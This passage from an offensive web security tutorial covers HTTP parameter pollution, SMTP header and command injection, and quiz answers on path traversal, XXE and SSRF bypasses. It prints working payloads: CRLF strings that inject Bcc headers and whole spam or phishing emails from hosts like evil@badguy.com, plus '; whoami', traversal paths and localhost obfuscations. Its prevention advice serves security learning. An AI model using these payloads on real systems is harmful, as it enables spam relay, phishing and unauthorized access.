For each crafted injection, observe how the application responds. Focus on parameters where you know a change triggers *a visible difference in behavior*, such as:

- Output on the page changes

- Different logic paths are followed (e.g., different user account info)

- Error messages appear or vanish

If the behavior stays the same as if no injection occurred, you’ve got a lead. It means the original parameter may be intact, and the injected one is being treated independently or preferentially elsewhere in the stack.

**Step 3: Try to Override Parameters in Multi-Location Requests**

Now test whether your injection can *override* a parameter later in the request. Consider this example:

```
FromAccount=18281008%26Amount%3d4444&Amount=1430&ToAccount=08447656
```

After URL decoding:

```
FromAccount=18281008&Amount=4444&Amount=1430&ToAccount=08447656
```

Now there are two ```Amount``` values, and on platforms like PHP, the *last one wins*. But on others (like Node.js’s ```qs``` or Java's servlet parsing), *first one wins*, or both get passed as arrays. Test how your target platform *resolves duplicated parameters*. This determines whether your injected value can *override* user-supplied or frontend-validated data.

**Step 4: Bypass Front-End Validation Using Backend Injection**

Some apps validate input client-side or even on the initial API gateway but then *trust the rewritten/parsed version* deeper in the stack. If you can inject values that:

- bypass frontend checks, *and*

- land in the backend parser due to duplication or decoding,

...then you've got a vector to do things like:

- Change the transfer amount

- Alter access control behavior

- Flip the action mode (e.g., view → edit)

**Step 5: Fuzz With Unexpected Parameter Names**

Once you've confirmed injection is possible, go wild with discovery:

- Try injecting other known backend parameters (e.g., ```isAdmin=true```, ```mode=delete```)

- Use parameter brute-forcing or wordlists like ```SecLists```'s ```Fuzzing/parameters.txt```

- Inject these using the same smuggling tricks (e.g., ```%26param=val```)

Some parameters may not appear in the UI at all but are recognized internally.

**Step 6: Abuse Redundant Parameter Submission Across Channels**

Apps may read parameters from:

- Query string

- POST body

- Cookies

- Headers (like ```X-Original-URL```, ```X-HTTP-Method-Override```)

Try duplicating the same parameter in multiple locations:

- Once in the query string: ```?role=user```

- Again in the POST body: ```role=admin```

- And maybe even in a cookie: ```Cookie: role=guest```

Observe which one takes priority. Some backends (like PHP’s ```$_REQUEST```) merge sources in a specific order: ```GET < POST < COOKIE```, unless otherwise configured.

**Tips:**

- Use Burp Repeater and Intruder to test various encodings and combinations quickly.

- Always double URL-decode responses to understand how the backend may be interpreting your inputs.

- Watch out for edge cases like null byte injection (```%00```) or *Unicode normalization* (try injecting lookalike characters like ```U+FF0E``` (fullwidth dot ```．```) or ```U+FEFF``` (zero-width no-break space) to smuggle payloads past filters that don’t normalize input properly).

- Try bypassing filters by injecting after whitelisted parameters (e.g., ```safe=1%26evil=true```).

#### Injecting into Mail Services:

Web applications often let users submit feedback, contact forms, or support requests. Behind the scenes, these features typically interface with an SMTP (mail) server. The server composes and sends an email, often using input supplied directly by the user.

If this input isn’t properly sanitized, attackers may be able to inject SMTP headers or commands into the conversation between the app and the mail server — a vulnerability known as SMTP injection.

Most mail-sending code allows users to control:

- The message body

- The "From" address

- Possibly the "Subject" or other fields

If user input is directly inserted into the email headers (especially when using simple APIs like PHP’s ```mail()``` function), an attacker can smuggle in additional headers like ```Cc```, ```Bcc```, or even manipulate the message content or delivery behavior.

Let’s consider a typical feedback form:

```
Your Email Address:  marcus@wahh-mail.com
Subject:             Site problem
Message:             Confirm Order page doesn't load.
```

Behind the scenes, this gets passed to PHP’s ```mail()``` function like so:

```
mail("admin@wahh-app.com", "Site problem", "Confirm Order page doesn't load.", 
     "From: marcus@wahh-mail.com");
```

Here, the fourth parameter (```additional_headers```) allows injection of custom headers — and that's where the danger begins.

If an attacker provides this in the "From" field:

```
marcus@wahh-mail.com%0ABcc: all@wahh-othercompany.com
```

Then after URL decoding, ```%0A``` becomes a newline character (```\n```), breaking the header structure and appending a malicious one:

```
From: marcus@wahh-mail.com
Bcc: all@wahh-othercompany.com
```

This results in an email that looks like:

```
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Bcc: all@wahh-othercompany.com
Subject: Site problem

Confirm Order page doesn't load.
```

Boom — a single user-submitted message now stealthily reaches extra recipients. This is often abused by spammers to send bulk email through insecure forms.

Header injections often rely on injecting newline characters. Here's a quick reference:

```
| Character | Description                 | URL-Encoded | Double-Encoded |
| --------- | --------------------------- | ----------- | -------------- |
| `\n` (LF) | Line Feed                   | `%0A`       | `%250A`        |
| `\r` (CR) | Carriage Return             | `%0D`       | `%250D`        |
| `\r\n`    | Carriage Return + Line Feed | `%0D%0A`    | `%250D%250A`   |
```

Some real-world payloads:

- ```marcus@site.com%0ABcc:spam@evil.com```

- ```marcus@site.com%0D%0ABcc:another@target.com```

These work best when passed unfiltered into functions like:

```
mail($to, $subject, $message, "From: $userInput");
```

Even worse: if your message body is also injectable, attackers might manipulate the entire structure of the message or even inject SMTP commands (though this is rarer on modern MTAs due to command sanitation).

#### SMTP Command Injection:

In some applications, rather than relying on simple wrappers like the ```mail()``` function, the system performs the SMTP conversation manually—either via custom code or through another component such as a mail-handling library or microservice. When this happens, and user input is directly inserted into the raw SMTP conversation, it opens up a much more powerful vulnerability: *SMTP command injection*.

This form of injection allows an attacker to craft inputs that inject full-blown SMTP commands, giving them control over not just the email’s metadata, but the entire message-sending process. This can lead to spamming, spoofing, or even relay attacks if the server is misconfigured.

Imagine a feedback form that sends data like this:

```
POST /feedback.php HTTP/1.1
Host: wahh-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

From=daf@wahh-mail.com&Subject=Site+feedback&Message=foo
```

The web application processes this and initiates the following SMTP conversation with its mail server:

```
MAIL FROM:<daf@wahh-mail.com>
RCPT TO:<feedback@wahh-app.com>
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site feedback

foo
.
```

**Note:** The SMTP ```DATA``` command signals the start of the email’s headers and body. The message is terminated by a single line containing just a period (```.```), followed by a newline (CRLF).

Now here's where things get interesting. If the application fails to sanitize inputs—especially newline characters (```\r\n``` or ```%0d%0a```)—you can smuggle raw SMTP commands inside your fields. Let’s say you inject into the ```Subject``` field:

```
POST /feedback.php HTTP/1.1
Host: wahh-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: ...

From=daf@wahh-mail.com&
Subject=Site+feedback%0d%0afoo%0d%0a.%0d%0aMAIL+FROM:<mail@wahh-viagra.com>%0d%0aRCPT+TO:<john@wahh-mail.com>%0d%0aDATA%0d%0aFrom:<mail@wahh-v1agra.com>%0d%0aTo:<john@wahh-mail.com>%0d%0aSubject: Cheap+V1AGR4%0d%0aBlah%0d%0a.%0d%0a&
Message=irrelevant
```

Here’s what you’re doing:

- ```%0d%0a``` = CRLF (carriage return + line feed), which SMTP uses to separate lines.

- ```%2e``` or just a period (```.```) on a new line ends the previous message (```DATA``` block).

- You’re injecting a full second SMTP conversation right inside the ```Subject```.

Resulting SMTP Session:

```
MAIL FROM:<daf@wahh-mail.com>
RCPT TO:<feedback@wahh-app.com>
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site feedback
foo
.
MAIL FROM:<mail@wahh-v1agra.com>
RCPT TO:<john@wahh-mail.com>
DATA
From: mail@wahh-v1agra.com
To: john@wahh-mail.com
Subject: Cheap V1AGR4

Blah
.
```

Just like that, two separate emails are generated. The first one looks legit, but the second? Fully controlled by the attacker—and perfect for spamming, phishing, or just chaos.

If you’re testing this manually, try injecting this into a vulnerable subject field:

```
Site feedback%0d%0a.%0d%0aRCPT TO:<victim@example.com>%0d%0aDATA%0d%0aFrom:<attacker@example.com>%0d%0aTo:<victim@example.com>%0d%0aSubject: Exploit%0d%0aYou've been pwned!%0d%0a.%0d%0a
```

If it goes through, congrats—you’ve found a classic case of SMTP command injection.

#### SMTP Command Injection – Hacking Tips and Payload Examples:

When targeting email functionality in web apps, you should always test whether SMTP command injection is possible—especially in feedback forms, contact forms, or any feature that lets users send emails through the server. Here’s a tested strategy to probe for SMTP injection vulnerabilities.

1. Submit These Payloads (One Parameter at a Time):

Inject the following strings into each of the email-related fields (```From```, ```To```, ```Subject```, etc.), one at a time. Make sure to insert your own email address so you can monitor whether emails get delivered to you.

```
<youremail>%0aCc:<youremail>
```

Adds a ```Cc:``` header via newline injection using LF (```%0a```).

```
<youremail>%0d%0aCc:<youremail>
```

Adds a ```Cc:``` header using CRLF (```%0d%0a```), the proper newline sequence in SMTP.

```
<youremail>%0aBcc:<youremail>
```

Injects a ```Bcc:``` header with LF line break.

```
<youremail>%0d%0aBcc:<youremail>
```

Injects a ```Bcc:``` header using CRLF. More compatible across mail servers.

```
%0aDATA%0afoo%0a.%0aMAIL FROM:<youremail>%0aRCPT TO:<youremail>%0aDATA%0aFrom:<youremail>%0aTo:<youremail>%0aSubject:test%0afoo%0a.%0a
```

Ends current message with a dot, then injects a *full new SMTP conversation* sending a test email to yourself. Critical to test for full command injection.

```
%0d%0aDATA%0d%0afoo%0d%0a.%0d%0aMAIL FROM:<youremail>
```

Same idea as above, but uses CRLF line endings. Safer for real-world targets that expect RFC-compliant input.

```
%0d%0aDATA%0d%0afoo%0d%0a.%0d%0aMAIL FROM:<youremail>%0d%0aRCPT TO:<youremail>%0d%0aDATA%0d%0aFrom:<youremail>%0d%0aTo:<youremail>%0d%0aSubject:test%0d%0afoo%0d%0a.%0d%0a
```

A full injected mail with proper CRLF everywhere. This is about as complete and clean as a command-injection payload gets.

2. Observe and Adapt:

- *Watch for error messages.* If the server spits out any mail-related errors (e.g., invalid SMTP response, malformed header), that’s gold. Refine your payload based on those clues.

- *Silent success is still success.* If you don’t see any feedback, don’t assume failure. Keep checking your inbox. Some apps silently queue or relay injected messages.

- *Inspect the HTML form.* Hidden or disabled form fields may contain things like ```to=feedback@target.com```. Modify that in the request to test if you can override the recipient.

3. Watch for OS Command Injection Too:

SMTP logic is often wired to local binaries like ```sendmail``` or custom mail scripts, especially in older PHP apps. This makes these endpoints double juicy—*they’re often unvalidated and may call shell commands directly.*

So while testing for SMTP injection, *also try command injection techniques* (```; whoami```, backticks, etc.). These endpoints often escape standard security testing.  Mail systems usually end an email message with a single period on its own line (```.\r\n```). If the app allows you to smuggle that in, you can prematurely end the message and begin issuing your own raw SMTP commands.

**Additional Notes: CRLF vs. LF – Why It Matters in SMTP Injection**

SMTP (Simple Mail Transfer Protocol) expects each line to end with a *carriage return followed by a line feed*, written as ```\r\n``` or URL-encoded as ```%0d%0a```. This is the CRLF sequence, and it’s part of the SMTP standard.

But why does this matter?

- LF (```\n``` or ```%0a```) *alone may work* on some misconfigured or lenient systems—especially if the backend is built on Unix-like environments (Linux, macOS).

- CRLF (```\r\n``` or ```%0d%0a```) *is the correct, RFC-compliant way* to terminate lines in SMTP, HTTP, and other protocols. Windows systems and strict parsers expect this.

- Injecting CRLF lets you *craft entirely new headers or SMTP commands*—you’re essentially ending one line and starting your own rogue instruction.

**Analogy:** Think of ```\r\n``` as a proper “Enter key” press that submits a new line in a formal letter. If you don’t use it, the parser might not take your input seriously—or it might ignore or mishandle it entirely.

**TL;DR**

- Use ```%0d%0a``` to *maximize compatibility.*

- Try ```%0a``` too, just in case the system’s naive and accepts it. If your payloads aren’t working, this tiny difference could be the invisible wall blocking your exploit.

**Visualizing SMTP Injection via CRLF:**

Let's say the app expects this input in the ```Subject``` field:

```
Subject: Feedback
```

And it builds the SMTP message like this:

```
MAIL FROM: user@example.com
RCPT TO: feedback@target.com
DATA
From: user@example.com
To: feedback@target.com
Subject: Feedback
[body text]
.
```

Now, you inject CRLF (```%0d%0a```) into ```Subject```, like this:

```
Feedback%0d%0aBCC: you@attacker.com
```

It becomes:

```
Subject: Feedback
BCC: you@attacker.com
```

SMTP message now looks like:

```
MAIL FROM: user@example.com
RCPT TO: feedback@target.com
DATA
From: user@example.com
To: feedback@target.com
Subject: Feedback
BCC: you@attacker.com
[body text]
.
```

Boom. You silently receive a copy.

Now imagine going full beast mode:

```
Subject: Legit%0d%0a.%0d%0aMAIL FROM: evil@badguy.com%0d%0aRCPT TO: victim@target.com%0d%0aDATA%0d%0aFrom: evil@badguy.com%0d%0aTo: victim@target.com%0d%0aSubject: surprise%0d%0aHello%0d%0a.%0d%0a
```

SMTP engine sees:

```
Subject: Legit
.
MAIL FROM: evil@badguy.com
RCPT TO: victim@target.com
DATA
From: evil@badguy.com
To: victim@target.com
Subject: surprise
Hello
.
```

You've just sent a second email. Controlled headers. Controlled body. Game on.

#### SMTP Injection Prevention and Summary:

SMTP injection vulnerabilities can often be avoided with strict input validation, especially for any user-controlled data passed to email functions or SMTP commands. Here's how to handle it properly:

- *E-mail addresses* should be validated using a strict regular expression that rejects any control characters, particularly newlines (```\n```, ```\r```), as they can prematurely terminate headers or inject new ones.

- *Message subjects* must also be newline-free and limited in length. This prevents header injection and malformed messages.

- *Message content* should be scrutinized if used directly in SMTP conversations. Especially, disallow any line consisting solely of a period (```.```), which SMTP interprets as end-of-data.

**Final Thoughts & Summary:**

We’ve covered a wide terrain of attacks against backend systems—SMTP, OS command injection, path traversal, XML parsing vulnerabilities, and header abuse. Some flaws scream their presence the moment you submit malformed input. Others whisper from the shadows, revealing themselves only after nuanced, layered probing.

You must be both patient and suspicious—question every parameter, test every field. The modern web app’s vast attack surface makes it feel like you’re spelunking in a data mine. But through repetition and real-world testing, you’ll develop that sixth sense—a hacker’s instinct for where to dig.

**Questions with Answers and Commentary:**

1. Why are web-based device configuration interfaces vulnerable to OS command injection?

These interfaces often rely on server-side scripts to run system commands. Developers may assume input is "trusted" because the interface is "internal", skipping proper sanitization. Combined with deep backend integrations, this opens the door wide for command injection.

*Admin portals live in the shadows and often think nobody’s watching. That’s your cue to shine the flashlight.*

2. You change ```country=US``` to ```country=foo``` and get Could not open file: ```D:\app\default\home\logs\foo.log```. What next?

Test for path traversal. Try ```../../../../windows/system32/drivers/etc/hosts``` or similar payloads to read from the file system.

*When you see full paths in error messages, it’s like the app handed you its keys and just asked you to be gentle. Spoiler: don’t.*

3. XML-based POSTs with server file reading? What vuln are we probing?

XXE (XML External Entity) attack. Requires a vulnerable XML parser that supports external entities and is improperly configured (e.g., no DTD parsing disabled).

*XXE is like whispering to the parser, "Hey, go fetch this file," and it politely obeys. All you had to do was ask wrong.*

4. ASP.NET request with multiple ```p=``` parameters. What value does ```Request.Params["p"]``` return?

It returns a comma-separated string of all values: ```urlparam1,urlparam2,cookieparam,bodyparam```

*This is classic HPP (HTTP Parameter Pollution). ASP.NET merges values from query string, body, and cookies. Good way to poison logic or inject subtle evil.*

5. Is HPP a prerequisite for HPI, or vice versa?

HPP (Parameter Pollution) is the enabler. HPI (Parameter Injection) is the result you aim for when exploitation succeeds.

*Think of HPP as the method of tampering and HPI as the glowing payload after detonation. They dance well together.*

6. Bypassing localhost block for server-side request forgery?

Use IP obfuscation tricks like:

- 2130706433 (integer form of 127.0.0.1)

- ```localhost%00.example.com```

- ```0x7f.0x0.0x0.0x1```

- Encoded IPv6: ```[::]```

- DNS rebinding to your attacker-controlled domain

*The road to localhost is littered with obfuscation. Don’t knock—just shapeshift.*

7. Preventing mail injection in a feedback form. Which is a valid defense?

Validate that the user-supplied inputs do not contain any newlines or SMTP metacharacters. Also, hardcoding the recipient is an excellent addition.

*You can lock the front door (validation) and weld it shut (hardcoding). Relaying rules help but don’t stop injection—they just block mail from leaving the crime scene.*
